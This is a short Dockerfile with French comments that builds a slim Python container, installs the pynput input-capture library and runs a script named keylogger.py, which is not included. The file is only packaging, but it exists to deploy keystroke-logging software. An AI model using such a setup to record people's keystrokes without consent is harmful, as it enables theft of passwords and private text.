# Utiliser une image de base légère avec Python
FROM python:3.9-slim

# Définir le répertoire de travail dans le conteneur
WORKDIR /app

# Installer les dépendances système nécessaires
RUN apt-get update && apt-get install -y \
    gcc \
    libx11-dev \
    && rm -rf /var/lib/apt/lists/*

# Copier les fichiers de l'application dans le conteneur
COPY . /app

# Installer les dépendances Python
RUN pip install --no-cache-dir pynput

# Exposer le port (si nécessaire)
# EXPOSE 8000

# Commande pour exécuter ton programme
CMD ["python", "keylogger.py"]
